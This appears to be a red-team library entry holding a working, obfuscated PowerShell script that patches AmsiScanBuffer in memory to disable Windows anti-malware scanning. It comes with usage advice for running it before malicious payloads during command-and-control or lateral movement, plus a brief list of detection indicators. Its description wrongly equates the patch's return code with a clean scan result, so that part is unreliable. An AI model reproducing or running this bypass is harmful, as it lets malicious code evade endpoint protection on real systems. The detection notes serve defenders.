---
id: d04968b8-b58b-40d8-9e71-f4107e50ef92
type: code
name: PowerShell-Patch-AMSI-ScanBuffer
language: Powershell
verified: true
created_at: '2023-01-11T19:21:21.173751+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - amsi-bypass
  - memory-patch
validated: true
---

# PowerShell-Patch-AMSI-ScanBuffer

## Code

```powershell
$ierku = @"
using System;
using System.Runtime.InteropServices;
public class ierku {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr cdzyrg, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ierku

$ibaoqco = [ierku]::LoadLibrary("$([CHAr]([BYTe]0x61)+[chAR](109*83/83)+[cHAR](115)+[cHaR]([BytE]0x69)+[cHaR]([bYte]0x2e)+[chaR]([ByTe]0x64)+[chAr]([bYTe]0x6c)+[cHaR]([byTE]0x6c))")
$ckdbww = [ierku]::GetProcAddress($ibaoqco, "$([Char](65*46/46)+[ChAr]([byte]0x6d)+[chAr](115+55-55)+[cHar](105+72-72)+[CHaR](11+72)+[cHar]([bYTE]0x63)+[cHaR](97+33-33)+[ChAr]([bYTE]0x6e)+[cHAR](66+45-45)+[chAr](95+22)+[CHAR]([BYte]0x66)+[cHar](102*43/43)+[ChAR]([BYTe]0x65)+[char](114*91/91))")
$p = 0
[ierku]::VirtualProtect($ckdbww, [uint32]5, 0x40, [ref]$p)
$itid = "0xB8"
$jjjd = "0x57"
$byjw = "0x00"
$qiai = "0x07"
$iprq = "0x80"
$mumw = "0xC3"
$bdfxh = [Byte[]] ($itid,$jjjd,$byjw,$qiai,+$iprq,+$mumw)
[System.Runtime.InteropServices.Marshal]::Copy($bdfxh, 0, $ckdbww, 6)
```

## Description

This PowerShell script bypasses AMSI by patching the AmsiScanBuffer function in amsi.dll to always return a clean result. It uses P/Invoke to call kernel32 functions for loading the DLL, getting the procedure address, and modifying memory protection. Strings are obfuscated using ASCII calculations to avoid static string-based detection. The patch overwrites the function prologue with bytes (0xB8 0x57 0x00 0x07 0x80 0xC3) that set EAX to 0x80070057 (AMSI_RESULT_CLEAN) and return.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This script has no user-defined parameters; it runs standalone in the current PowerShell session. | N/A |

## Usage

Execute this script at the beginning of a PowerShell session before running any potentially malicious content. It is ideal for red team operations where AMSI blocks payload execution, such as in command-and-control or lateral movement phases. After running, test with a blocked script to confirm (e.g., one using obfuscated IEX downloads). Used in procedures like [[procedures/AMSI-Bypass-via-Memory-Patch]].

## Detection

- PowerShell ScriptBlock logging will capture the Add-Type and P/Invoke calls; look for DllImport of kernel32 and VirtualProtect.
- Sysmon Event ID 10 for memory protection changes on amsi.dll regions.
- Behavioral detection of hex byte arrays or obfuscated strings like "a" + "m" + "s" + "i".
- AMSI itself may log failed scans post-patch if not fully effective; monitor for unusual clean results on known malicious content.

## Related

- [[procedures/AMSI-Bypass-via-Memory-Patch]]
